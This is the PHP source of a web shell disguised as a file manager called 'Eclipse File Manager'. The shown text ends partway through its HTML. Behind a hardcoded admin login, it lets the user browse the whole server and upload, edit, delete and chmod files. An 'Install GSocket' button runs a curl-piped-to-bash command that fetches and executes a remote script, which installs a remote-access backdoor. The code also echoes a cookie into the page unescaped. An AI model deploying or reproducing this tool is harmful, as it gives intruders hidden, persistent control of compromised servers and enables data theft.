<?php
session_start();
$current_filename = basename($_SERVER['SCRIPT_FILENAME']);
$default_username = 'admin'; // admin
$default_password_hash = '$2a$12$UBIkydbkd50bmZuaQXb0NuvrPd7XeeIKbFaGRYdvJDIHkGQ8GxOZe'; // admin123
if (!isset($_SESSION['chat_session_id'])) {
    $_SESSION['chat_session_id'] = md5($_SERVER['REMOTE_ADDR'] . time());
}
if (isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    if ($username === $default_username && password_verify($password, $default_password_hash)) {
        $_SESSION['authenticated'] = true;
        $_SESSION['username'] = $username;
        $_SESSION['login_time'] = time();
        
        $_SESSION['alert'] = [
            'type' => 'success',
            'message' => 'Login successful! Welcome to Eclipse File Manager.'
        ];
        header("Location: $current_filename");
        exit;
    } else {
        $_SESSION['alert'] = [
            'type' => 'danger',
            'message' => 'Invalid username or password.'
        ];
    }
}
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: $current_filename");
    exit;
}
$authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();
function formatSize($s) {
    if ($s >= 1073741824) return round($s / 1073741824, 2) . ' GB';
    if ($s >= 1048576) return round($s / 1048576, 2) . ' MB';
    if ($s >= 1024) return round($s / 1024, 2) . ' KB';
    return $s . ' B';
}
$search_results = [];
$search_query = '';
if (isset($_GET['search']) && !empty($_GET['search'])) {
    $search_query = $_GET['search'];
    $search_results = searchFiles($path, $search_query);
}

function searchFiles($directory, $query) {
    $results = [];
    $items = scandir($directory);
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $fullPath = $directory . '/' . $item;
        if (stripos($item, $query) !== false) {
            $results[] = [
                'path' => $fullPath,
                'name' => $item,
                'is_dir' => is_dir($fullPath),
                'size' => is_file($fullPath) ? filesize($fullPath) : 0
            ];
        }
        if (is_dir($fullPath)) {
            $subResults = searchFiles($fullPath, $query);
            $results = array_merge($results, $subResults);
        }
    }
    
    return $results;
}
function isWritable($path) {
    return is_writable($path);
}
function isExecutable($path) {
    return is_executable($path);
}
function formatPermissions($path) {
    $perms = substr(sprintf('%o', fileperms($path)), -4);
    $writable = isWritable($path);
    $executable = isExecutable($path);
    
    $class = '';
    if ($writable) {
        $class = 'perm-writable';
    } else {
        $class = 'perm-not-writable';
    }
    
    if ($executable) {
        $class .= ' perm-executable';
    }
    
    return '<span class="' . $class . '">' . $perms . '</span>';
}
if ($authenticated) {
    if (isset($_GET['delete'])) {
        $target = realpath($path . '/' . $_GET['delete']);
        if (strpos($target, $path) === 0 && is_writable($target)) {
            if (is_file($target)) {
                if (unlink($target)) {
                    $_SESSION['alert'] = [
                        'type' => 'success',
                        'message' => 'File deleted successfully.'
                    ];
                } else {
                    $_SESSION['alert'] = [
                        'type' => 'danger',
                        'message' => 'Failed to delete file.'
                    ];
                }
            } elseif (is_dir($target)) {
                if (rmdir($target)) {
                    $_SESSION['alert'] = [
                        'type' => 'success',
                        'message' => 'Folder deleted successfully.'
                    ];
                } else {
                    $_SESSION['alert'] = [
                        'type' => 'danger',
                        'message' => 'Failed to delete folder. Make sure it is empty.'
                    ];
                }
            }
        }
        header("Location: ?path=" . urlencode($path));
        exit;
    }
    if (isset($_POST['rename_from'], $_POST['rename_to'])) {
        $from = realpath($path . '/' . $_POST['rename_from']);
        $to = $path . '/' . basename($_POST['rename_to']);
        if (strpos($from, $path) === 0 && file_exists($from)) {
            if (rename($from, $to)) {
                $_SESSION['alert'] = [
                    'type' => 'success',
                    'message' => 'Item renamed successfully.'
                ];
            } else {
                $_SESSION['alert'] = [
                    'type' => 'danger',
                    'message' => 'Failed to rename item.'
                ];
            }
        }
        header("Location: ?path=" . urlencode($path));
        exit;
    }
    if (isset($_POST['new_folder'])) {
        $folder_name = basename($_POST['new_folder']);
        if (mkdir($path . '/' . $folder_name)) {
            $_SESSION['alert'] = [
                'type' => 'success',
                'message' => "Folder '$folder_name' created successfully."
            ];
        } else {
            $_SESSION['alert'] = [
                'type' => 'danger',
                'message' => "Failed to create folder '$folder_name'."
            ];
        }
        header("Location: ?path=" . urlencode($path));
        exit;
    }
    if (isset($_POST['new_file'])) {
        $file_name = basename($_POST['new_file']);
        if (file_put_contents($path . '/' . $file_name, '') !== false) {
            $_SESSION['alert'] = [
                'type' => 'success',
                'message' => "File '$file_name' created successfully."
            ];
        } else {
            $_SESSION['alert'] = [
                'type' => 'danger',
                'message' => "Failed to create file '$file_name'."
            ];
        }
        header("Location: ?path=" . urlencode($path));
        exit;
    }
    if (isset($_FILES['upload'])) {
        $upload_count = 0;
        $error_count = 0;
        if (is_array($_FILES['upload']['name'])) {
            foreach ($_FILES['upload']['name'] as $key => $name) {
                if ($_FILES['upload']['error'][$key] === 0) {
                    $upload_name = basename($name);
                    if (move_uploaded_file($_FILES['upload']['tmp_name'][$key], $path . '/' . $upload_name)) {
                        $upload_count++;
                    } else {
                        $error_count++;
                    }
                } else {
                    $error_count++;
                }
            }
            
            if ($upload_count > 0) {
                $_SESSION['alert'] = [
                    'type' => 'success',
                    'message' => "$upload_count file(s) uploaded successfully" . ($error_count > 0 ? ", $error_count failed" : ".")
                ];
            } else {
                $_SESSION['alert'] = [
                    'type' => 'danger',
                    'message' => "Failed to upload files."
                ];
            }
        } else {
            if ($_FILES['upload']['error'] === 0) {
                $upload_name = basename($_FILES['upload']['name']);
                if (move_uploaded_file($_FILES['upload']['tmp_name'], $path . '/' . $upload_name)) {
                    $_SESSION['alert'] = [
                        'type' => 'success',
                        'message' => "File '$upload_name' uploaded successfully."
                    ];
                } else {
                    $_SESSION['alert'] = [
                        'type' => 'danger',
                        'message' => "Failed to upload file '$upload_name'."
                    ];
                }
            } else {
                $_SESSION['alert'] = [
                    'type' => 'danger',
                    'message' => "Upload error: " . $_FILES['upload']['error']
                ];
            }
        }
        
        header("Location: ?path=" . urlencode($path));
        exit;
    }
    if (isset($_POST['save_file'], $_POST['content'])) {
        $file = realpath($path . '/' . $_POST['save_file']);
        if (strpos($file, $path) === 0 && is_file($file)) {
            if (file_put_contents($file, $_POST['content']) !== false) {
                $_SESSION['alert'] = [
                    'type' => 'success',
                    'message' => "File saved successfully."
                ];
            } else {
                $_SESSION['alert'] = [
                    'type' => 'danger',
                    'message' => "Failed to save file."
                ];
            }
        }
        header("Location: ?path=" . urlencode($path) . "&edit=" . urlencode($_POST['save_file']));
        exit;
    }
if (isset($_POST['chmod_path'], $_POST['chmod_value'])) {
    $chmod_path = realpath($_POST['chmod_path']);
    $chmod_value = $_POST['chmod_value'];
    if (!preg_match('/^[0-7]{3,4}$/', $chmod_value)) {
        $_SESSION['alert'] = [
            'type' => 'danger',
            'message' => 'Invalid permission format. Please use octal format (e.g. 644, 755).'
        ];
        header("Location: ?path=" . urlencode($path));
        exit;
    }
    if (substr($chmod_value, 0, 1) === '0') {
        $chmod_value = substr($chmod_value, 1);
    }
    $chmod_octal = octdec($chmod_value);
    
    if (strpos($chmod_path, $path) === 0 && file_exists($chmod_path)) {
        if (chmod($chmod_path, $chmod_octal)) {
            $_SESSION['alert'] = [
                'type' => 'success',
                'message' => 'Permissions changed successfully to ' . $chmod_value
            ];
        } else {
            $_SESSION['alert'] = [
                'type' => 'danger',
                'message' => 'Failed to change permissions to ' . $chmod_value
            ];
        }
    }
    
    header("Location: ?path=" . urlencode($path));
    exit;
}
    if (isset($_GET['install_gsocket'])) {
        $output = [];
        $return_var = 0;
        exec('bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1', $output, $return_var);
        
        $_SESSION['gsocket_output'] = $output;
        $_SESSION['gsocket_status'] = $return_var;
        
        header("Location: ?path=" . urlencode($path) . "&gsocket_installed=1");
        exit;
    }
    if (isset($_GET['read_file']) && !empty($_GET['read_file'])) {
        $file_name = basename($_GET['read_file']);
        $file_path = $path . '/' . $file_name;
        
        header('Content-Type: application/json');
        
        if (file_exists($file_path) && is_file($file_path) && is_readable($file_path)) {
            $content = file_get_contents($file_path);
            echo json_encode([
                'success' => true,
                'content' => $content
            ]);
        } else {
            echo json_encode([
                'success' => false,
                'error' => 'File does not exist or is not readable'
            ]);
        }
        exit;
    }
    if (isset($_GET['get_permissions']) && !empty($_GET['path'])) {
        $perm_path = $_GET['path'];
        
        header('Content-Type: application/json');
        
        if (file_exists($perm_path)) {
            $perms = fileperms($perm_path);
            echo json_encode([
                'success' => true,
                'permissions' => $perms
            ]);
        } else {
            echo json_encode([
                'success' => false,
                'error' => 'File does not exist'
            ]);
        }
        exit;
    }
}
function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    
    $iconMap = [
        'txt' => 'text',
        'pdf' => 'pdf',
        'doc' => 'word',
        'docx' => 'word',
        'xls' => 'excel',
        'xlsx' => 'excel',
        'ppt' => 'powerpoint',
        'pptx' => 'powerpoint',
        'jpg' => 'image',
        'jpeg' => 'image',
        'png' => 'image',
        'gif' => 'image',
        'svg' => 'image',
        'mp3' => 'audio',
        'wav' => 'audio',
        'mp4' => 'video',
        'mov' => 'video',
        'zip' => 'archive',
        'rar' => 'archive',
        'tar' => 'archive',
        'gz' => 'archive',
        'php' => 'code',
        'html' => 'code',
        'css' => 'code',
        'js' => 'code',
        'json' => 'code',
        'xml' => 'code',
    ];
    
    return isset($iconMap[$ext]) ? $iconMap[$ext] : 'file';
}
function getEditorMode($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    
    $modeMap = [
        'php' => 'application/x-httpd-php',
        'html' => 'text/html',
        'htm' => 'text/html',
        'css' => 'text/css',
        'js' => 'text/javascript',
        'json' => 'application/json',
        'xml' => 'application/xml',
        'md' => 'text/x-markdown',
        'txt' => 'text/plain',
        'ini' => 'text/x-properties',
        'conf' => 'text/x-properties',
        'sql' => 'text/x-sql',
        'py' => 'text/x-python',
        'java' => 'text/x-java',
        'c' => 'text/x-csrc',
        'cpp' => 'text/x-c++src',
        'cs' => 'text/x-csharp',
        'go' => 'text/x-go',
        'rb' => 'text/x-ruby',
        'sh' => 'text/x-sh',
        'yaml' => 'text/x-yaml',
        'yml' => 'text/x-yaml',
    ];
    
    return isset($modeMap[$ext]) ? $modeMap[$ext] : 'text/plain';
}
function isViewable($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $viewable = ['jpg', 'jpeg', 'png', 'gif', 'svg', 'pdf', 'txt', 'md', 'html', 'htm'];
    return in_array($ext, $viewable);
}
function getMimeType($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    
    $mimeMap = [
        'jpg' => 'image/jpeg',
        'jpeg' => 'image/jpeg',
        'png' => 'image/png',
        'gif' => 'image/gif',
        'svg' => 'image/svg+xml',
        'pdf' => 'application/pdf',
        'txt' => 'text/plain',
        'md' => 'text/markdown',
        'html' => 'text/html',
        'htm' => 'text/html',
    ];
    
    return isset($mimeMap[$ext]) ? $mimeMap[$ext] : 'application/octet-stream';
}
$theme = isset($_COOKIE['theme']) ? $_COOKIE['theme'] : 'light';
?>
<!DOCTYPE html>
<html lang="en" data-theme="<?php echo $theme; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eclipse File Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/theme/dracula.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/theme/eclipse.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/dialog/dialog.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/search/matchesonscrollbar.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/foldgutter.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/hint/show-hint.min.css">
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/eclibesec/EclipseFileManager@main/styles.css">
</head>
<body>
    <?php if (!$authenticated): ?>
    <div class="login-container">
        <div class="login-card">
            <div class="login-header">
                <h2>Eclipse File Manager</h2>
                <p>Please login first</p>
            </div>
            <div class="login-body">
                <?php if (isset($_SESSION['alert'])): ?>
                <div class="alert alert-<?php echo $_SESSION['alert']['type']; ?>">
                    <i class="fas fa-<?php echo $_SESSION['alert']['type'] === 'success' ? 'check-circle' : 'exclamation-circle'; ?>"></i>
                    <span><?php echo $_SESSION['alert']['message']; ?></span>
                </div>
                <?php unset($_SESSION['alert']); endif; ?>
                
                <form method="post">
                    <div class="form-group">
                        <label for="username" class="form-label">Username</label>
                        <input type="text" name="username" id="username" class="form-control" placeholder="Enter username" required autofocus>
                    </div>
                    <div class="form-group">
                        <label for="password" class="form-label">Password</label>
                        <input type="password" name="password" id="password" class="form-control" placeholder="Enter password" required>
                    </div>
                    <button type="submit" name="login" class="btn btn-primary btn-block">
                        <i class="fas fa-sign-in-alt"></i>
                        <span>Login</span>
                    </button>
                </form>
            </div>
            <div class="login-footer">
                <p class="text-muted text-sm">Eclipse File Manager</p>
            </div>
        </div>
    </div>
    <?php else: ?>
    <div class="toast-container" id="toastContainer"></div>
    
    <div class="container">
        <aside class="sidebar" id="sidebar">
            <div class="sidebar-header">
                <div class="logo">
                    <i class="fas fa-folder"></i>
                    <span>Eclipse File Manager</span>
                </div>
                <button class="btn btn-sm btn-icon btn-light mobile-toggle" id="closeSidebar">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="sidebar-content">
                <div class="user-info mb-4">
                    <div class="user-avatar">
                        <?php echo strtoupper(substr($_SESSION['username'], 0, 1)); ?>
                    </div>
                    <div class="user-details">
                        <div class="user-name"><?php echo htmlspecialchars($_SESSION['username']); ?></div>
                        <div class="user-role">Administrator</div>
                    </div>
                </div>
                
                <div class="search-box">
                    <i class="fas fa-search search-icon"></i>
                    <form action="" method="get">
                        <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
                        <input type="text" name="search" class="search-input" placeholder="Search files..." value="<?php echo htmlspecialchars($search_query); ?>">
                    </form>
                </div>
                <div class="card mb-4">
                    <div class="card-body p-3">
                        <div class="d-flex align-items-center gap-3 mb-3">
                            <i class="fas fa-hdd text-primary" style="font-size: 1.5rem;"></i>
                            <div>
                                <div class="text-sm text-muted">Storage</div>
                                <div class="text-sm">
                                    <?php
                                    $totalSpace = disk_total_space($path);
                                    $freeSpace = disk_free_space($path);
                                    $usedSpace = $totalSpace - $freeSpace;
                                    $usedPercent = round(($usedSpace / $totalSpace) * 100);
                                    echo formatSize($usedSpace) . ' / ' . formatSize($totalSpace);
                                    ?>
                                </div>
                            </div>
                        </div>
                        <div style="height: 6px; background-color: var(--border); border-radius: 3px; overflow: hidden;">
                            <div style="height: 100%; width: <?php echo $usedPercent; ?>%; background-color: var(--primary);"></div>
                        </div>
                        <div class="text-xs text-right text-muted mt-1"><?php echo $usedPercent; ?>% used</div>
                    </div>
                </div>
                <div class="sidebar-menu">
                    <div class="sidebar-menu-title">Quick Access</div>
                    <ul class="sidebar-menu-items">
                        <li class="sidebar-menu-item">
                            <a href="?path=<?php echo urlencode(getcwd()); ?>" class="sidebar-menu-link">
                                <span class="sidebar-menu-icon"><i class="fas fa-home"></i></span>
                                <span>Home Directory</span>
                            </a>
                        </li>
                        <?php if (is_dir(getcwd() . '/uploads')): ?>
                        <li class="sidebar-menu-item">
                            <a href="?path=<?php echo urlencode(getcwd() . '/uploads'); ?>" class="sidebar-menu-link">
                                <span class="sidebar-menu-icon"><i class="fas fa-upload"></i></span>
                                <span>Uploads</span>
                            </a>
                        </li>
                        <?php endif; ?>
                        <li class="sidebar-menu-item">
                            <a href="?path=<?php echo urlencode($path); ?>&view=chat" class="sidebar-menu-link <?php echo isset($_GET['view']) && $_GET['view'] === 'chat' ? 'active' : ''; ?>">
                                <span class="sidebar-menu-icon"><i class="fas fa-robot"></i></span>
                                <span>Chat AI</span>
                            </a>
                        </li>
                    </ul>
                </div>
                <div class="sidebar-menu">
                    <div class="sidebar-menu-title">Tools</div>
                    <ul class="sidebar-menu-items">
                        <li class="sidebar-menu-item">
                            <a href="#" class="sidebar-menu-link" id="openNewFolderModalBtn">
                                <span class="sidebar-menu-icon"><i class="fas fa-folder-plus"></i></span>
                                <span>New Folder</span>
                            </a>
                        </li>
                        <li class="sidebar-menu-item">
                            <a href="#" class="sidebar-menu-link" id="openNewFileModalBtn">
                                <span class="sidebar-menu-icon">
                                    <i class="fas fa-file"></i>
                                    <i class="fas fa-plus" style="font-size: 0.7em; position: absolute; margin-left: -0.5em; margin-top: -0.5em;"></i>
                                </span>
                                <span>New File</span>
                            </a>
                        </li>
                        <li class="sidebar-menu-item">
                            <a href="#" class="sidebar-menu-link" id="openUploadModalBtn">
                                <span class="sidebar-menu-icon"><i class="fas fa-cloud-upload-alt"></i></span>
                                <span>Upload Files</span>
                            </a>
                        </li>
                        <li class="sidebar-menu-item">
                            <a href="?path=<?php echo urlencode($path); ?>&install_gsocket=1" class="sidebar-menu-link">
                                <span class="sidebar-menu-icon"><i class="fas fa-network-wired"></i></span>
                                <span>Install GSocket</span>
                            </a>
                        </li>
                    </ul>
                </div>
                <button class="theme-toggle" id="themeToggle">
                    <i class="fas fa-<?php echo $theme === 'dark' ? 'sun' : 'moon'; ?>"></i>
                    <span><?php echo $theme === 'dark' ? 'Light Mode' : 'Dark Mode'; ?></span>
                </button>
            </div>
            <div class="sidebar-footer">
                <a href="?logout=true" class="btn btn-danger btn-block">
                    <i class="fas fa-sign-out-alt"></i>
                    <span>Logout</span>
                </a>
            </div>
        </aside>

        <main class="main-content">
            <div class="topbar">
                <div class="d-flex align-items-center gap-3">
                    <button class="btn btn-sm btn-icon btn-light mobile-toggle" id="openSidebar">
                        <i class="fas fa-bars"></i>
                    </button>
                    <div class="breadcrumb">
                        <?php
                        if (isset($_GET['view']) && $_GET['view'] === 'chat') {
                            echo '<div class="breadcrumb-item">';
                            echo '<a href="?path=' . urlencode($path) . '" class="breadcrumb-link"><i class="fas fa-home"></i></a>';
                            echo '</div>';
                            echo '<span class="current-path">/Chat AI</span>';
                        } else {
                            $parts = explode('/', $path);
                            $breadcrumb = '';
                            
                            echo '<div class="breadcrumb-item">';
                            echo '<a href="?path=/" class="breadcrumb-link"><i class="fas fa-home"></i></a>';
                            echo '</div>';
                            
                            foreach ($parts as $i => $part) {
                                if (empty($part)) continue;
                                
                                $breadcrumb .= '/' . $part;
                                
                                if ($i === count($parts) - 1) {
                                    echo '<span class="current-path">/' . htmlspecialchars($part) . '</span>';
                                } else {
                                    echo '<a href="?path=' . urlencode($breadcrumb) . '" class="breadcrumb-link">/' . htmlspecialchars($part) . '</a>';
                                }
                            }
                        }
                        ?>
                    </div>
                </div>
                <div>
                    <?php if (!isset($_GET['view']) || $_GET['view'] !== 'chat'): ?>
                    <button class="btn btn-sm btn-primary" id="openUploadModalTopBtn">
                        <i class="fas fa-upload"></i>
                        <span>Upload</span>
                    </button>
                    <?php else: ?>
                    <button class="btn btn-sm btn-primary" id="newChatSession">
                        <i class="fas fa-plus"></i>
                        <span>New Chat</span>
                    </button>
                    <?php endif; ?>
                </div>
            </div>

            <div class="content">
                <?php if (isset($_SESSION['alert'])): ?>
                <div class="alert alert-<?php echo $_SESSION['alert']['type']; ?>">
                    <i class="fas fa-<?php echo $_SESSION['alert']['type'] === 'success' ? 'check-circle' : 'exclamation-circle'; ?>"></i>
                    <span><?php echo $_SESSION['alert']['message']; ?></span>
                </div>
                <script>
                    document.addEventListener('DOMContentLoaded', function() {
                        showToast('<?php echo $_SESSION['alert']['type']; ?>', 
                                '<?php echo $_SESSION['alert']['type'] === 'success' ? 'Success' : 'Error'; ?>', 
                                '<?php echo addslashes($_SESSION['alert']['message']); ?>');
                    });
                </script>
                <?php unset($_SESSION['alert']); endif; ?>

                <?php if (!empty($search_query)): ?>
                <!-- Search Results -->
                <div class="search-results">
                    <div class="search-results-header">
                        Search results for "<?php echo htmlspecialchars($search_query); ?>" (<?php echo count($search_results); ?> found)
                    </div>
                    <div class="search-results-body">
                        <?php if (empty($search_results)): ?>
                        <div class="text-center p-3 text-muted">No results found</div>
                        <?php else: ?>
                        <?php foreach ($search_results as $result): ?>
                        <div class="search-result-item">
                            <a href="?path=<?php echo urlencode(dirname($result['path'])); ?><?php echo $result['is_dir'] ? '' : '&edit=' . urlencode(basename($result['path'])); ?>" class="search-result-link">
                                <div class="search-result-icon <?php echo $result['is_dir'] ? 'folder' : getFileIcon(basename($result['path'])); ?>" style="background-color: <?php echo $result['is_dir'] ? 'var(--warning)' : ''; ?>">
                                    <i class="fas fa-<?php echo $result['is_dir'] ? 'folder' : 'file'; ?>"></i>
                                </div>
                                <div>
                                    <div class="search-result-name"><?php echo htmlspecialchars(basename($result['path'])); ?></div>
                                    <div class="search-result-path"><?php echo htmlspecialchars(dirname($result['path'])); ?></div>
                                </div>
                            </a>
                        </div>
                        <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                </div>
                <?php endif; ?>

                <?php if (isset($_GET['view']) && $_GET['view'] === 'chat'): ?>
                <div class="chat-container">
                    <div class="chat-header">
                        <div class="chat-title">
                            <i class="fas fa-robot"></i>
                            <span>EclipseAI Assistant</span>
                        </div>
                        <div>
                            <button class="btn btn-sm btn-light" id="newChatBtn">
                                <i class="fas fa-plus"></i>
                                <span>New Chat</span>
                            </button>
                        </div>
                    </div>
                    <div class="chat-body" id="chatMessages">
                        <div class="chat-empty" id="chatEmpty">
                            <div class="chat-empty-icon">
                                <i class="fas fa-robot"></i>
                            </div>
                            <div class="chat-empty-title">EclipseAI Assistant</div>
                            <div class="chat-empty-text">
                                Hello! I'm EclipseAI, your AI assistant. I can help you solve problems, answer questions, and provide information on various topics. How can I assist you today?
                            </div>
                        </div>
                    </div>
                    <div class="chat-footer">
                        <form id="chatForm" class="chat-form">
                            <label class="chat-attachment">
                                <i class="fas fa-paperclip"></i>
                                <input type="file" id="chatFile" accept="image/*,.pdf,.doc,.docx,.txt">
                            </label>
                            <input type="text" id="chatInput" class="chat-input" placeholder="Type your message..." autocomplete="off">
                            <button type="submit" class="chat-send" id="chatSend">
                                <i class="fas fa-paper-plane"></i>
                            </button>
                        </form>
                        <div id="chatFilePreview"></div>
                        <div id="chatTyping" class="chat-typing" style="display: none;">
                            <span>EclipseAI is typing</span>
                            <div class="typing-dots">
                                <div class="typing-dot"></div>
                                <div class="typing-dot"></div>
                                <div class="typing-dot"></div>
                            </div>
                        </div>
                        <div id="chatError" class="chat-error" style="display: none;">
                            <div class="chat-error-icon">
                                <i class="fas fa-exclamation-circle"></i>
                            </div>
                            <div class="chat-error-text">An error occurred. Please try again.</div>
                            <button class="chat-error-retry" id="chatRetry">Retry</button>
                        </div>
                    </div>
                </div>
                <?php elseif (isset($_GET['preview']) && !empty($_GET['preview'])): ?>
                <?php
                $preview_file = realpath($path . '/' . $_GET['preview']);
                if (strpos($preview_file, $path) === 0 && is_file($preview_file) && isViewable(basename($preview_file))):
                    $filename = basename($preview_file);
                    $mime_type = getMimeType($filename);
                    $file_ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
                ?>
                <div class="preview-container">
                    <div class="preview-header">
                        <div class="preview-title">
                            <i class="fas fa-eye"></i>
                            <span>Previewing: <?php echo htmlspecialchars($filename); ?></span>
                        </div>
                        <div>
                            <a href="<?php echo htmlspecialchars($preview_file); ?>" download class="btn btn-sm btn-primary">
                                <i class="fas fa-download"></i>
                                <span>Download</span>
                            </a>
                            <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($filename); ?>" class="btn btn-sm btn-light">
                                <i class="fas fa-edit"></i>
                                <span>Edit</span>
                            </a>
                        </div>
                    </div>
                    <div class="preview-body">
                        <?php if (in_array($file_ext, ['jpg', 'jpeg', 'png', 'gif', 'svg'])): ?>
                        <img src="<?php echo htmlspecialchars($preview_file); ?>" alt="<?php echo htmlspecialchars($filename); ?>" class="preview-image">
                        <?php elseif ($file_ext === 'pdf'): ?>
                        <iframe src="<?php echo htmlspecialchars($preview_file); ?>" class="preview-pdf"></iframe>
                        <?php else: ?>
                        <pre class="preview-text"><?php echo htmlspecialchars(file_get_contents($preview_file)); ?></pre>
                        <?php endif; ?>
                    </div>
                </div>
                <?php endif; ?>
                <?php else: ?>
                <div class="action-buttons">
                    <button class="btn btn-light" id="openNewFolderModalAction">
                        <i class="fas fa-folder-plus"></i>
                        <span>New Folder</span>
                    </button>
                    <button class="btn btn-light" id="openNewFileModalAction">
                        <i class="fas fa-plus"></i>
                        <i class="fas fa-file"></i>
                        <span>New File</span>
                    </button>
                    <button class="btn btn-light" id="openUploadModalAction">
                        <i class="fas fa-upload"></i>
                        <span>Upload Files</span>
                    </button>
                    <button class="btn btn-light" id="refreshBtn">
                        <i class="fas fa-sync-alt"></i>
                        <span>Refresh</span>
                    </button>
                </div>

                <div class="file-list">
                    <div class="file-list-header">
                        <div>Name</div>
                        <div>Size</div>
                        <div>Permissions</div>
                        <div>Actions</div>
                    </div>
                    <div class="file-list-body">
                        <?php if ($path !== '/'): ?>
                        <div class="file-item">
                            <div class="file-name">
                                <div class="file-icon folder">
                                    <i class="fas fa-level-up-alt"></i>
                                </div>
                                <a href="?path=<?php echo urlencode(dirname($path)); ?>" class="file-link">..</a>
                            </div>
                            <div class="file-size">-</div>
                            <div class="file-perm">-</div>
                            <div class="file-actions">-</div>
                        </div>
                        <?php endif; ?>

                        <?php
                        $items = scandir($path);
                        $folders = [];
                        $files = [];
                        
                        foreach ($items as $item) {
                            if ($item === '.' || $item === '..') continue;
                            
                            $fullPath = $path . '/' . $item;
                            if (is_dir($fullPath)) {
                                $folders[] = $item;
                            } else {
                                $files[] = $item;
                            }
                        }
                        sort($folders);
                        sort($files);
                        foreach ($folders as $folder) {
                            $fullPath = $path . '/' . $folder;
                            ?>
                            <div class="file-item">
                                <div class="file-name">
                                    <div class="file-icon folder">
                                        <i class="fas fa-folder"></i>
                                    </div>
                                    <a href="?path=<?php echo urlencode($fullPath); ?>" class="file-link"><?php echo htmlspecialchars($folder); ?></a>
                                </div>
                                <div class="file-size">-</div>
                                <div class="file-perm"><?php echo formatPermissions($fullPath); ?></div>
                                <div class="file-actions">
                                    <button class="btn btn-sm btn-outline rename-btn" data-name="<?php echo htmlspecialchars($folder); ?>">
                                        <i class="fas fa-edit"></i>
                                    </button>
                                    <button class="btn btn-sm btn-outline delete-btn" data-name="<?php echo htmlspecialchars($folder); ?>" data-path="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($folder); ?>">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                    <button class="btn btn-sm btn-outline chmod-btn" data-name="<?php echo htmlspecialchars($folder); ?>" data-path="<?php echo htmlspecialchars($fullPath); ?>">
                                        <i class="fas fa-key"></i>
                                    </button>
                                </div>
                            </div>
                            <?php
                        }
                        foreach ($files as $file) {
                            $fullPath = $path . '/' . $file;
                            $fileSize = filesize($fullPath);
                            $fileIcon = getFileIcon($file);
                            ?>
                            <div class="file-item">
                                <div class="file-name">
                                    <div class="file-icon <?php echo $fileIcon; ?>">
                                        <i class="fas fa-<?php echo $fileIcon === 'folder' ? 'folder' : 'file'; ?>"></i>
                                    </div>
                                    <?php if (isViewable($file)): ?>
                                    <a href="?path=<?php echo urlencode($path); ?>&preview=<?php echo urlencode($file); ?>" class="file-link"><?php echo htmlspecialchars($file); ?></a>
                                    <?php else: ?>
                                    <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($file); ?>" class="file-link"><?php echo htmlspecialchars($file); ?></a>
                                    <?php endif; ?>
                                </div>
                                <div class="file-size"><?php echo formatSize($fileSize); ?></div>
                                <div class="file-perm"><?php echo formatPermissions($fullPath); ?></div>
                                <div class="file-actions">
                                    <button class="btn btn-sm btn-outline rename-btn" data-name="<?php echo htmlspecialchars($file); ?>">
                                        <i class="fas fa-edit"></i>
                                    </button>
                                    <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($file); ?>" class="btn btn-sm btn-outline">
                                        <i class="fas fa-code"></i>
                                    </a>
                                    <a href="<?php echo htmlspecialchars($fullPath); ?>" download class="btn btn-sm btn-outline">
                                        <i class="fas fa-download"></i>
                                    </a>
                                    <button class="btn btn-sm btn-outline delete-btn" data-name="<?php echo htmlspecialchars($file); ?>" data-path="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($file); ?>">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                    <button class="btn btn-sm btn-outline chmod-btn" data-name="<?php echo htmlspecialchars($file); ?>" data-path="<?php echo htmlspecialchars($fullPath); ?>">
                                        <i class="fas fa-key"></i>
                                    </button>
                                </div>
                            </div>
                            <?php
                        }
                        
                        if (empty($folders) && empty($files)) {
                            echo '<div class="text-center p-3 text-muted">This folder is empty</div>';
                        }
                        ?>
                    </div>
                </div>
                <?php if (isset($_GET['edit'])): ?>
                <?php
                $edit = realpath($path . '/' . $_GET['edit']);
                if (strpos($edit, $path) === 0 && is_file($edit)):
                    $content = htmlspecialchars(file_get_contents($edit));
                    $filename = basename($edit);
                    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
